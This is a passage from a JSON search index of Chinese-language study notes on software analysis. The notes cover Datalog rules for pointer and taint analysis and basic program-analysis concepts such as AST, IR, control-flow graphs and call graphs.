\u5728\u5b9e\u73b0\u4e0a\u7684\u786e\u5341\u5206\u7b80\u6d01\u3002\u8fd9\u91cc\u5c31\u4e0d\u5c55\u793a\u63a8\u7406\u8fc7\u7a0b\u4e86\uff0c\u611f\u5174\u8da3\u7684\u540c\u5b66\u53ef\u4ee5\u81ea\u884c\u5b66\u4e60\u4e00\u4e0b\u8bfe\u4ef6\u3002</p> <p>\u6700\u540e\u6765\u770b\u4e00\u4e0b\u5982\u4f55\u5904\u7406 Call \u89c4\u5219\uff1a</p> <p></p> <p>Call \u89c4\u5219\u6bd4\u8f83\u590d\u6742\uff0c\u5176\u5bf9\u5e94\u7684\u65b0\u589e EDB \u5982\u4e0b\uff1a</p> <ul> <li><code>VCall(l:S, x:V, k:M)</code></li> <li><code>Dispatch(o:O, k:M, m:M)</code></li> <li><code>ThisVar(m:M, this:V)</code></li> <li><code>Argument(l:S, i:N, ai:V)</code></li> <li><code>Parameter(m:M, i:N, pi:V)</code></li> <li><code>MethodReturn(m:M, ret:V)</code></li> <li><code>CallReturn(l:S, r:V)</code></li> </ul> <p>\u65b0\u589e\u7684 IDB \u5982\u4e0b\uff1a</p> <ul> <li><code>Reachable(m:M)</code></li> <li><code>CallGraph(l:S, m:M)</code></li> </ul> <p>\u6211\u4eec\u9700\u8981\u4e09\u6761 Datalog \u8bed\u53e5\u6765\u8868\u793a Call \u89c4\u5219\uff1a</p> <pre><code>VarPointsTo(this, o), Reachable(m), CallGraph(l, m) &lt;- VCall(l, x, k), VarPointsTo(x, o), Dispatch(o, k, m), ThisVar(m, this).\nVarPointsTo(pi, o) &lt;- CallGraph(l, m), Argument(l, i , ai), Parameter(m, i, pi), VarPointsTo(ai, o).\nVarPointsTo(r, o) &lt;- CallGraph(l, m), MethodReturn(m, ret), VarPointsTo(ret, o), CallReturn(l, r).\n</code></pre> <p>\u6700\u7ec8\uff0c\u9488\u5bf9\u4e4b\u524d\u7684\u4ee3\u7801\u6bb5\uff0c\u6211\u4eec\u5f97\u51fa\u5982\u4e0b Datalog \u5206\u6790\u89c4\u5219\uff1a</p> <pre><code>Reachable(m) &lt;- EntryMethod(m).\nVarPointsTo(x, o) &lt;- Reachable(m), New(x, o, m).\nVarPointsTo(x, o) &lt;- Assign(x, y), VarPointsTo(y, o).\nFieldPointsTo(oi, f, oj) &lt;- Store(x, f, y), VarPointsTo(x, oi), VarPointsTo(y, oj).\nVarPointsTo(x, o) &lt;- Load (y, x, f), VarPointsTo(x, oi), FieldPointsTo(oi, f, oj).\nVarPointsTo(this, o), Reachable(m), CallGraph(l, m) &lt;- VCall(l, x, k), VarPointsTo(x, o), Dispatch(o, k, m), ThisVar(m, this).\nVarPointsTo(pi, o) &lt;- CallGraph(l, m), Argument(l, i , ai), Parameter(m, i, pi), VarPointsTo(ai, o).\nVarPointsTo(r, o) &lt;- CallGraph(l, m), MethodReturn(m, ret), VarPointsTo(ret, o), CallReturn(l, r).\n</code></pre> <p>\u6ce8\u610f\uff0c\u6211\u4eec\u5728\u5f00\u5934\u589e\u52a0\u4e86\u89c4\u5219\uff0c\u7528\u4e8e\u628a entry \u52a0\u5165\u5230 Reachable \u4e2d\uff0c\u5b9e\u73b0\u521d\u59cb\u5316\u3002</p>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E3%80%8A%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%8B/#datalog_3","title":"\u57fa\u4e8e Datalog \u7684\u6c61\u70b9\u5206\u6790","text":"<p>\u5728\u6307\u9488\u5206\u6790\u7684\u57fa\u7840\u4e0a\uff0c\u6211\u4eec\u6765\u7814\u7a76\u4e00\u4e0b\u5982\u4f55\u57fa\u4e8e Datalog \u5b9e\u73b0\u6c61\u70b9\u5206\u6790\u3002</p> <p>\u7ed3\u5408\u4e4b\u524d\u5b66\u4e60\u7684\u6c61\u70b9\u5206\u6790\u6d41\u7a0b\uff0c\u6211\u4eec\u989d\u5916\u589e\u52a0\u7684 EDB \u8c13\u8bcd\u5982\u4e0b\uff1a</p> <ul> <li><code>Source(m:M)</code></li> <li><code>Sink(m:M, i:N)</code></li> <li><code>Taint(l:S, t:T)</code></li> </ul> <p>\u65b0\u589e\u7684 IDB \u8c13\u8bcd\u5982\u4e0b\uff1a</p> <ul> <li><code>TaintFlow(sr:S, sn:S, i:N)</code></li> </ul> <p>\u5176\u4e2d<code>i:N</code>\u8868\u793a sink call site \u7684\u7b2c i \u4e2a\u53c2\u6570\u3002</p> <p></p> <p>\u5bf9\u6b64\uff0c\u6211\u4eec\u65b0\u589e\u4e24\u6761 Datalog \u89c4\u5219\uff1a</p> <pre><code>VarPointsTo(r, t) &lt;- CallGraph(l, m), Source(m), CallReturn(l, r), Taint(l, t).\nTaintFlow(j, l, i) &lt;- CallGraph(l, m), Sink(m, i), Argument(l, i, ai), VarPointsTo(ai, t), Taint(j, t).\n</code></pre>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E5%8D%97%E5%A4%A7%E3%80%8A%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%8B/#_15","title":"\u603b\u7ed3\u4e0e\u601d\u8003","text":"<p>\u53ef\u4ee5\u53d1\u73b0\uff0cDatalog \u7684\u4f18\u70b9\u5f88\u660e\u663e\uff1a\u7b80\u6d01\u3001\u53ef\u8bfb\u3001\u6613\u4e8e\u5b9e\u73b0\u3002\u53e6\u5916\uff0cDatalog \u5f15\u64ce\u7684\u6027\u80fd\u5c06\u76f4\u63a5\u5f71\u54cd\u5230\u7a0b\u5e8f\u5206\u6790\u6548\u679c\u3002\u5b83\u7684\u7f3a\u70b9\u540c\u6837\u660e\u663e\uff1a\u65e0\u6cd5\u5145\u5206\u8868\u8fbe\u67d0\u4e9b\u903b\u8f91\uff08\u4f8b\u5982\uff0c\u975e\u5168\u7a0b\u5355\u8c03\u7684\u5206\u6790\uff09\uff0c\u53e6\u5916\u5176\u6027\u80fd\u662f\u65e0\u6cd5\u5145\u5206\u63a7\u5236\u7684\uff0c\u53d7\u5f15\u64ce\u9650\u5236\u3002</p>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF/","title":"\u7a0b\u5e8f\u5206\u6790\u6280\u672f","text":""},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF/#_1","title":"\u57fa\u672c\u6982\u5ff5","text":""},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF/#analysisverification","title":"\u5206\u6790\uff08analysis\uff09\u4e0e\u9a8c\u8bc1\uff08verification\uff09","text":"<p>\u5728 Paper \u4e2d\u5e38\u6709\u4e24\u4e2a\u6982\u5ff5\uff1a\u5206\u6790\u548c\u9a8c\u8bc1\uff0c\u9a8c\u8bc1\u5e38\u4ee5\u5f62\u5f0f\u5316\u9a8c\u8bc1\uff08formal verification\uff09\u7684\u5f62\u5f0f\u51fa\u73b0\u3002</p> <p>\u9996\u5148\uff0c\u6b64\u5904\u7684\u8ba8\u8bba\u5206\u6790\u548c\u9a8c\u8bc1\u5e94\u7528\u7684\u5bf9\u8c61\u90fd\u4e3a\u7a0b\u5e8f\uff08program\uff09\u3002</p> <p>\u62bd\u8c61\u7684\u8bf4\uff0cformal verification \u662f\u628a\u7a0b\u5e8f\u8f6c\u5316\u5230\u67d0\u4e2a\u6570\u5b66\u57df\u4e0a\uff0c\u540c\u65f6\u628a\u6211\u4eec\u9700\u8981\u6ee1\u8db3\u7684\u67d0\u4e2a\u9700\u6c42\u6216\u8005\u7279\u6027\uff08property\uff09\u8f6c\u6362\u5230\u540c\u4e00\u4e2a\u6570\u5b66\u57df\u4e0a\uff0c\u6700\u540e\u9a8c\u8bc1\u4e00\u4e0b\u4e8c\u8005\u662f\u5426\u5339\u914d\u3002</p> <p>program analysis \u4e5f\u80fd\u4ee5\u8fd9\u79cd\u65b9\u5f0f\u5b9a\u4e49\uff0c\u56e0\u4e3a\u5728\u5177\u4f53\u5e94\u7528\u7684\u65f6\u5019\uff0c\u603b\u80fd\u627e\u5230\u5bf9\u5e94\u7684\u6570\u5b66\u57df\uff0c\u6bd4\u5982\u63a7\u5236\u6d41\u6216\u8005\u6570\u636e\u6d41\uff0c\u4e5f\u603b\u80fd\u6839\u636e\u6211\u4eec\u8981\u5206\u6790\u7684\u95ee\u9898\u6765\u62bd\u8c61\u51fa property\uff0c\u6bd4\u5982\u6570\u636e\u6d41\u9700\u8981\u6ee1\u8db3\u67d0\u79cd\u4f20\u64ad\u6761\u4ef6\u3002</p> <p>\u6240\u4ee5\u53ef\u4ee5\u8ba4\u4e3a\u5206\u6790\u4e0e\u9a8c\u8bc1\u662f\u540c\u4e00\u4e2a\u4e1c\u897f\u3002</p> <p>Reference: https://www.zhihu.com/question/438252679</p> <p>\u5f53\u4ece\u5177\u8c61\u5316\u7684\u5c42\u9762\u7406\u89e3\uff0c\u7a0b\u5e8f\u5206\u6790\u901a\u5e38\u662f\u5bf9\u76ee\u6807\u7a0b\u5e8f\u7684\u63a7\u5236\u6d41\u56fe\uff08CFG\uff09\u8fdb\u884c\u5206\u6790\uff0c\u800c\u9a8c\u8bc1\u66f4\u591a\u7684\u662f\u5224\u65ad\u4ee3\u7801\u7684\u884c\u4e3a (behaviour) \u4e0e\u8bbe\u8ba1\u6307\u6807 (specification) \u662f\u5426\u5339\u914d\u3002</p> <p>\u9759\u6001\u5206\u6790</p> <p>TODO sound \u7b49\u7b49</p>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF/#astir","title":"\u7f16\u8bd1\u5668\u3001AST\u3001IR","text":""},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF/#_2","title":"\u7f16\u8bd1\u5668","text":"<p>\u4ece\u7f16\u8bd1\u5668\u8bb2\u8d77\uff0c\u7f16\u8bd1\u5668\u5206\u4e3a\u524d\u7aef\u548c\u540e\u7aef\uff0c\u524d\u7aef\u8d1f\u8d23\u5c06\u6e90\u7801\u7f16\u8bd1\u4e3a\u4e2d\u95f4\u8868\u793a\uff0c\u540e\u7aef\u8d1f\u8d23\u5c06\u4e2d\u95f4\u8868\u793a\u7f16\u8bd1\u4e3a\u673a\u5668\u4ee3\u7801\uff0801 \u4e8c\u8fdb\u5236\uff09\uff0c\u5177\u4f53\u6d41\u7a0b\u5982\u4e0b\uff1a</p> <ul> <li>Scanner\uff0c\u8bcd\u6cd5\u5206\u6790\u5668\uff0c\u63a5\u53d7\u6e90\u7801\u8f93\u51fa\u5b57\u7b26\u6d41\u3002</li> <li>Parser\uff0c\u8bed\u6cd5\u5206\u6790\u5668\uff0c\u63a5\u53d7\u5b57\u7b26\u6d41\uff0c\u8f93\u51fa AST</li> <li>Type Checker\uff1a\u8bed\u4e49\u5206\u6790\u5668\uff0c\u8fdb\u884c\u7c7b\u578b\u68c0\u67e5\u7b49\u5de5\u4f5c\uff0c\u8f93\u51fa\u4e5f\u662f AST</li> <li>Translator\uff1a\u7f16\u8bd1\u5668\u4e2d\u7aef\u5c06 AST \u7ffb\u8bd1\u4e3a\u591a\u79cd\u4e2d\u95f4\u8868\u793a\uff08IR\uff09\uff0c\u5e38\u7528\u7684\u5982\u4e09\u5730\u5740\u7801\u3002\u9759\u6001\u5206\u6790\u901a\u5e38\u57fa\u4e8e IR \u8fdb\u884c\uff01</li> <li>Code Generator\uff1a\u7f16\u8bd1\u5668\u540e\u7aef\u5c06 IR \u7ffb\u8bd1\u4e3a\u673a\u5668\u4ee3\u7801</li> </ul> <p></p>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF/#ast","title":"AST","text":"<p>\u62bd\u8c61\u8bed\u6cd5\u6811\uff08AST\uff09\u662f\u6e90\u4ee3\u7801\u7684\u62bd\u8c61\u8bed\u6cd5\u7ed3\u6784\u7684\u6811\u72b6\u8868\u793a\uff0c\u6811\u4e0a\u7684\u6bcf\u4e2a\u8282\u70b9\u90fd\u8868\u793a\u6e90\u4ee3\u7801\u4e2d\u7684\u4e00\u79cd\u7ed3\u6784\uff0c\u4e4b\u6240\u4ee5\u8bf4\u662f\u62bd\u8c61\u7684\uff0c\u662f\u56e0\u4e3a\u62bd\u8c61\u8bed\u6cd5\u6811\u5e76\u4e0d\u4f1a\u8868\u793a\u51fa\u771f\u5b9e\u8bed\u6cd5\u51fa\u73b0\u7684\u6bcf\u4e00\u4e2a\u7ec6\u8282\u3002</p> <p>\u5728\u5177\u4f53\u5b9e\u73b0\u7684\u8fc7\u7a0b\u4e2d\uff0c\u62bd\u8c61\u8bed\u6cd5\u6811\uff0c\u5176\u5b9e\u5c31\u662f\u7528\u6811\u72b6\u7ed3\u6784\u8868\u793a\u8bed\u6cd5\u7ed3\u6784\uff0c\u4e5f\u6ca1\u6709\u8bf4\u5fc5\u987b\u662f\u4ec0\u4e48\u5f62\u5f0f\uff0c\u53ea\u8981\u80fd\u5fe0\u5b9e\u5730\u53cd\u6620\u51fa\u6e90\u7801\u7684\u683c\u5f0f\u5373\u53ef\u3002</p> <p>Java Parser \u63d0\u4f9b\u4e86 Yaml\u3001XML \u548c Graphiz dot \u7b49\u683c\u5f0f\u63cf\u8ff0 AST\uff0c\u4e5f\u6709\u5176\u4ed6\u5de5\u5177\u652f\u6301\u8f93\u51fa Json \u683c\u5f0f\u7684 AST\uff0c\u4f8b\u5982 Coverity\u3002</p> <p>\u5728\u4e00\u822c\u6587\u732e\u4e2d\uff0c\u90fd\u662f\u753b\u4e00\u4e2a\u6811\u72b6\u7ed3\u6784\u51fa\u6765\uff1a</p> <p></p> <p>\u76f8\u6bd4\u4e8e IR\uff0cAST \u66f4 high-level\uff0c\u66f4\u63a5\u8fd1\u7a0b\u5e8f\u7ed3\u6784\uff0c\u66f4\u4f9d\u8d56\u4e8e\u6e90\u7a0b\u5e8f\u4fe1\u606f\u3002</p>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF/#ir","title":"IR","text":"<p>\u901a\u5e38\u9759\u6001\u5206\u6790\u57fa\u4e8e\u4e2d\u95f4\u8868\u793a\uff08IR\uff09\u8fdb\u884c\uff0cIR \u6709\u5f88\u591a\u7684\u5f62\u5f0f\uff0c\u4f8b\u5982\u4e09\u5730\u5740\u7801\uff083AC\uff09\u3001\u9759\u6001\u5355\u8d4b\u503c\u5f62\u5f0f\uff08SSA\uff09\uff0c\u5176\u4e2d\u4e09\u5730\u5740\u7801\u662f\u6700\u5e38\u7528\u7684\u5f62\u5f0f\uff0c\u4f8b\u5982\u76ee\u524d\u6700\u6d41\u884c\u7684 Java \u9759\u6001\u5206\u6790\u6846\u67b6 Soot \uff0c\u5176 IR \u662f Jimple\uff1atyped 3-address code\u3002</p> <p>IR \u4e0e AST \u7684\u533a\u522b\uff1a</p> <ul> <li>IR \u662f AST \u8fdb\u4e00\u6b65\u7684\u62bd\u8c61\uff0c\u66f4\u63a5\u8fd1\u673a\u5668\u8bed\u8a00\uff0c\u53ef\u4ee5\u8ba4\u4e3a\u548c\u8bed\u8a00\u65e0\u5173\uff0c\u662f\u8fde\u63a5\u524d\u540e\u7aef\u7684\u4e00\u79cd\u4e2d\u95f4\u8868\u793a\uff0c\u56e0\u6b64\u5f53\u7f16\u7a0b\u8bed\u8a00\u5347\u7ea7\u65f6\uff08Java7 - Java8 \u65b0\u589e lambda \u8868\u8fbe\u5f0f\u3001\u51fd\u6570\u5f15\u7528\u7b49\u7279\u6027\uff09\uff0c\u5bf9\u5e94\u7684 AST \u5fc5\u5b9a\u65b0\u589e\u8282\u70b9\uff0c\u800c IR \u5219\u57fa\u672c\u7a33\u5b9a\u4e0d\u4f1a\u53d1\u751f\u53d8\u5316\u3002</li> <li>AST \u4e3a\u4e86\u4f53\u73b0\u6e90\u7801\u7684\u7a0b\u5e8f\u7ed3\u6784\uff0c\u5f80\u5f80\u6bd4\u8f83\u590d\u6742\uff0c\u800c\u4e09\u5730\u5740\u7ecf\u8fc7\u5904\u7406\uff0c\u4e00\u822c\u6bd4\u8f83\u7d27\u51d1\uff0c\u7b80\u5355\u3002\u4f8b\u5982 for\u3001while\u3001do while \u7b49\u5faa\u73af\u65b9\u5f0f\u5728 AST \u5c42\u9762\u5b8c\u5168\u4e0d\u540c\uff0c\u4f46\u5728 IR \u5c42\u9762\u662f\u76f8\u540c\u7684\uff0c\u5373 IR \u5f80\u5f80\u4f53\u73b0\u4e86\u63a7\u5236\u6d41\uff08control flow\uff09\u4fe1\u606f\uff0c\u800c AST \u4e0d\u4f1a\u3002</li> <li>IR \u4e0e\u8bed\u8a00\u65e0\u5173\uff0c\u5728\u90e8\u5206\u9759\u6001\u4ee3\u7801\u5206\u6790\u5de5\u5177\u5b9e\u73b0\u65f6\uff0c\u4f1a\u5bf9\u4e0d\u540c\u8bed\u8a00\u7684 IR \u5b9e\u73b0\u540c\u4e00\u4e2a\u5206\u6790\u5f15\u64ce\uff0c\u53ea\u662f\u901a\u8fc7\u5f00\u53d1\u4e0d\u540c\u8bed\u8a00\u7684\u89c4\u5219\uff0c\u5b9e\u73b0\u5bf9\u4e0d\u540c\u8bed\u8a00\u7684\u80fd\u529b\u7684\u8986\u76d6\uff0c\u800c AST \u662f\u65e0\u6cd5\u505a\u5230\u8fd9\u4e00\u70b9\u7684\u3002</li> </ul> <p>\u9700\u8981\u77e5\u9053 IR \u5728\u9759\u6001\u5206\u6790\u4e2d\u662f\u6781\u5176\u91cd\u8981\u7684\uff0c\u800c\u4e09\u5730\u5740\u7801\u66f4\u662f\u88ab\u8ba4\u4e3a\u662f\u9759\u6001\u5206\u6790\u7684\u57fa\u7840\u4e4b\u4e00\u3002</p>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF/#ir_1","title":"IR \u7684\u751f\u6210\u3001\u9009\u62e9\u53ca\u5e94\u7528\u65b9\u5f0f","text":"<p>\u9759\u6001\u7a0b\u5e8f\u5206\u6790\u6709\u57fa\u4e8e\u6e90\u7801\u7684\u7a0b\u5e8f\u5206\u6790\u548c\u57fa\u4e8e\u4e8c\u8fdb\u5236\u7684\u7a0b\u5e8f\u5206\u6790\u3002\u76f8\u5e94\u7684\u751f\u6210\u4e2d\u95f4\u8868\u793a\u7684\u65b9\u6cd5\u4e0d\u540c\uff1a</p> <ul> <li>\u57fa\u4e8e\u6e90\u7801\u7684\u7a0b\u5e8f\u5206\u6790\uff0c\u4e3b\u8981\u5e94\u7528\u5230\u4e86\u7f16\u8bd1\u539f\u7406\u76f8\u5173\u7684\u6280\u672f\uff0c\u662f\u6b63\u5411\u7684 IR \u7684\u751f\u6210\u3002</li> <li>\u57fa\u4e8e\u4e8c\u8fdb\u5236\u7684\u7a0b\u5e8f\u5206\u6790\uff0c\u4e3b\u8981\u9700\u8981\u5bf9\u4e8c\u8fdb\u5236\u7a0b\u5e8f\u8fdb\u884c\u53cd\u6c47\u7f16\uff0c\u662f\u9006\u5411\u7684 IR \u751f\u6210\u3002</li> </ul> <p>\u9759\u6001\u4ee3\u7801\u5206\u6790\u5de5\u5177\u7684\u68c0\u67e5\u65b9\u6cd5\u4e3b\u8981\u6709\u9762\u5411\u7a0b\u5e8f\u7ed3\u6784\u7684\u68c0\u67e5\u548c\u57fa\u4e8e\u6570\u636e\u6d41\u7684\u68c0\u67e5\u3002\u76f8\u5e94\u7684\u9009\u62e9\u7684 IR \u7c7b\u578b\u4e5f\u4e0d\u540c\uff1a</p> <ul> <li>\u9762\u5411\u7a0b\u5e8f\u7ed3\u6784\u7684\u68c0\u67e5\uff0c\u4e00\u5b9a\u662f\u57fa\u4e8e AST \u8fdb\u884c\u7684\u68c0\u67e5\uff0c\u6709\u65f6\u5019\u9700\u8981\u7ed3\u5408 Token \u548c \u7b26\u53f7\u8868 \u4e00\u8d77\u68c0\u67e5\uff1b</li> <li>\u57fa\u4e8e\u6570\u636e\u6d41\u7684\u68c0\u67e5\uff0c\u4e00\u822c\u90fd\u662f\u5728\u4e09\u5730\u5740\u7801\uff08\u6216 SSA\uff09\u5f62\u5f0f\u7684\u4e2d\u95f4\u8868\u793a\u4e0a\u9762\u5206\u6790\uff0c\u4e5f\u53ef\u4ee5\u5728 AST \u4e0a\u9762\u8fdb\u884c\u5206\u6790\u3002</li> </ul> <p>\u5b66\u672f\u754c\u901a\u5e38\u9009\u62e9\u4e09\u5730\u5740\u7801\u4f5c\u4e3a IR\uff0c\u800c\u5de5\u4e1a\u754c\u5982 coverity \u548c fortify \u8fd9\u6837\u7684\u5934\u90e8\u9759\u6001\u7a0b\u5e8f\u5206\u6790\u5de5\u5177\uff0c\u90fd\u662f\u5728 AST \u4e0a\u9762\u6267\u884c\u7684\u6570\u636e\u6d41\u5206\u6790</p> <p>\u4e8b\u5b9e\u4e0a\uff0c\u9759\u6001\u5206\u6790\u5de5\u5177\u5728\u6267\u884c\u5206\u6790\u65f6\uff0c\u4e0d\u4f1a\u76f4\u63a5\u5728 IR \u4e0a\u8fdb\u884c\u5206\u6790\uff0c\u800c\u662f\u5728\u4e2d\u95f4\u8868\u793a\u4e0a\u8fdb\u884c\u5404\u79cd\u62bd\u8c61\uff0c\u4ece\u800c\u7b80\u5316\u6211\u4eec\u7684\u5206\u6790\uff1a</p> <p></p> <ul> <li>\u6700\u5e95\u5c42\u662f\u8f93\u5165\u7684\u4e2d\u95f4\u8868\u793a\uff0c\u901a\u5e38\u5982\u679c\u6709\u9700\u8981\uff0c\u53ef\u4ee5\u8fdb\u884c\u5e8f\u5217\u5316\u5904\u7406\uff0c\u7136\u540e\u76f4\u63a5\u8bfb\u5165\uff0c\u4f8b\u5982 clang \u53ef\u4ee5 dump AST\uff0cllvm \u7684 bc \u6587\u4ef6\u5c31\u662f\u4e00\u79cd SSA \u5f62\u5f0f\u7684\u4e2d\u95f4\u8868\u793a\uff1b</li> <li>\u4e2d\u95f4\u7684\u4e00\u5c42\u662f\u5728\u4e2d\u95f4\u8868\u793a\u4e0a\u751f\u6210\u7684\u6570\u636e\u8868\u793a\uff0c\u4e00\u822c\u57fa\u4e8e\u4e2d\u95f4\u8868\u793a\u6267\u884c\u6570\u636e\u6d41\u5206\u6790\u65f6\uff0c\u90fd\u9700\u8981\u751f\u6210\u8fd9\u90e8\u5206\u7ed3\u6784\uff1b</li> <li>\u6700\u4e0a\u9762\u7684\u4e00\u5c42\uff0c\u662f\u5f53\u524d\u6bd4\u8f83\u5178\u578b\u7684\u4e24\u79cd\u6bd4\u8f83\u9ad8\u7ea7\u7684\u62bd\u8c61\u5f62\u5f0f\u3002\u5bf9 CPG \u76f8\u5173\u7684\u6982\u5ff5\uff0c\u6700\u521d\u662f\u5728 joern \u5de5\u5177\u4e2d\u5f15\u5165\u7684\uff0c\u7efc\u5408\u4e86\u5404\u79cd\u4ee3\u7801\u8868\u793a\uff0c\u5e76\u653e\u5230\u56fe\u6570\u636e\u5e93\u4e2d\uff0c\u5bf9 SVFG \u76f8\u5173\u6982\u5ff5\uff0c\u5728 SVF \u4e2d\u5f15\u5165\u7684\uff0c\u5e76\u4e14\uff0c\u57fa\u4e8e\u8be5\u6846\u67b6\uff0c\u5b9e\u73b0\u4e86\u4e00\u79cd\u57fa\u4e8e SVFG \u7684 MemoryLeak \u7684\u68c0\u67e5\u5de5\u5177\u3002</li> </ul>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF/#cfgbb","title":"\u63a7\u5236\u6d41\u56fe\uff08CFG\uff09\u4e0e\u57fa\u7840\u5757\uff08BB\uff09","text":"<p>\u5728\u5f88\u591a\u9759\u6001\u5206\u6790\u5de5\u5177\u7684\u5f00\u53d1\u5b9e\u8df5\u4e2d\uff0c\u5c06 BB\u3001CFG \u7684\u6784\u9020\uff0c\u548c IR\uff083AC\u3001SSA\uff09\u7684\u751f\u6210\uff0c\u653e\u5728\u76f8\u540c\u9636\u6bb5\uff0c\u56e0\u6b64\u4e5f\u53ef\u4ee5\u5c06 CFG \u4e5f\u7406\u89e3\u4e3a\u4e00\u79cd\u4e2d\u95f4\u8868\u793a\uff0c\u5f53\u7136\u4e5f\u6709\u8d44\u6599\u5c06 CFG \u4e0d\u5f53\u505a IR\u3002</p> <p>CFG \u662f\u9759\u6001\u5206\u6790\u7684\u57fa\u672c\u7ed3\u6784\uff0c\u5176\u8282\u70b9\u53ef\u4ee5\u662f\u5355\u72ec\u7684\u8bed\u53e5\uff0c\u4e5f\u53ef\u4ee5\uff08\u901a\u5e38\uff09\u662f\u4e00\u4e2a\u57fa\u672c\u5757\uff08BB\uff09\uff0c\u662f\u4e00\u4e2a\u6709\u5411\u56fe\u3002</p> <p>\u8bed\u53e5\u901a\u5e38\u662f\u4e09\u5730\u5740\u7801\uff08a = b + c\uff09\uff0c\u4f46\u5728\u4ee5\u592a\u574a\u7684\u9759\u6001\u5206\u6790\u8f6f\u4ef6 Oyente \u4e2d\uff0c\u57fa\u672c\u5757\u4e2d\u7684\u8bed\u53e5\u662f\u7531\u4e8c\u8fdb\u5236\u4ee3\u7801\u53cd\u6c47\u7f16\u5f97\u5230\u7684\u6c47\u7f16\u8bed\u53e5\uff08\u4f8b\u5982 PUSH 0X01\u3001JUMP\uff09</p> <p>BB \u662f\u6ee1\u8db3\u4e0b\u5217\u5173\u7cfb\u7684\u8bed\u53e5\u7684\u6700\u5927\u5e8f\u5217\u96c6\u5408\uff1a</p> <ul> <li>\u53ea\u53ef\u4ee5\u4ece BB \u4e2d\u7684\u7b2c\u4e00\u6761\u6307\u4ee4\u8fdb\u5165</li> <li>\u53ea\u53ef\u4ee5\u4ece BB \u4e2d\u7684\u6700\u540e\u4e00\u6761\u6307\u4ee4\u9000\u51fa</li> <li>BB \u4e2d\u7684\u8bed\u53e5\u5fc5\u987b\u6309\u7167\u987a\u5e8f\u4f9d\u6b21\u6267\u884c</li> </ul> <p>CFG \u53ef\u4ee5\u7528\u4e00\u4e2a\u4e09\u5143\u5f0f\u63cf\u8ff0\uff1aG=(N, E, n0)</p> <p>\u5176\u4e2d\uff1a</p> <ul> <li> <p>N\uff1a\u8868\u793a\u6240\u6709\u57fa\u672c\u5757\u8282\u70b9\u7684\u96c6\u5408\uff1b</p> </li> <li> <p>E\uff1a\u8868\u793a\u6240\u6709\u8fb9\u7684\u96c6\u5408\uff1b</p> </li> <li> <p>n0\uff1a\u8868\u793a\u9996\u8282\u70b9\u3002</p> </li> </ul> <p>CFG \u5177\u6709\u5982\u4e0b\u7684\u4e24\u6761\u6027\u8d28\uff1a</p> <ul> <li>CFG \u5fc5\u7136\u6709\u552f\u4e00\u7684\u4e00\u4e2a\u5165\u53e3\u70b9\uff1b</li> <li>\u9996\u8282\u70b9\u5fc5\u7136\u652f\u914d CFG \u4e2d\u5176\u4ed6\u7684\u6240\u6709\u8282\u70b9\uff08\u5373\u4ece\u9996\u8282\u70b9\u5230 CFG \u4e0a\u5176\u4ed6\u4efb\u4f55\u4e00\u4e2a\u8282\u70b9\u90fd\u6709\u4e00\u6761\u8def\u53ef\u4ee5\u8fde\u901a\uff09\u3002</li> </ul> <p>\u6ce8\u610f\u5230 CFG \u53ea\u80fd\u7528\u4e8e\u5206\u6790\u5355\u4e2a\u51fd\u6570\u5185\u7684\u63a7\u5236\u6d41\u8f6c\u6362\uff0c\u6d89\u53ca\u5230\u8de8\u8d8a\u51fd\u6570\u8fb9\u754c\u7684\u63a7\u5236\u6d41\u5219\u65e0\u6cd5\u5206\u6790\uff0c\u56e0\u6b64\u5f15\u5165 CG \u548c ICFG\u3002</p>"},{"location":"security/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90/%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF/#cg-icfg","title":"\u8c03\u7528\u56fe\uff08CG\uff09 \u4e0e\u8fc7\u7a0b\u95f4\u63a7\u5236\u6d41\u56fe\uff08ICFG\uff09","text":"<p>CG\uff1a\u672c\u8d28\u662f\u8c03\u7528\u8fb9\u7684\u96c6\u5408\uff0c\u4ece\u8c03\u7528\u70b9\uff08call-sites\uff09\u5230\u76ee\u6807\u51fd\u6570\uff08target methods / callees\uff09\u7684\u8fb9\u3002</p> <p></p> <p>ICFG = CFG + (Call edges + Return edges)</p> <ul> <li>Call 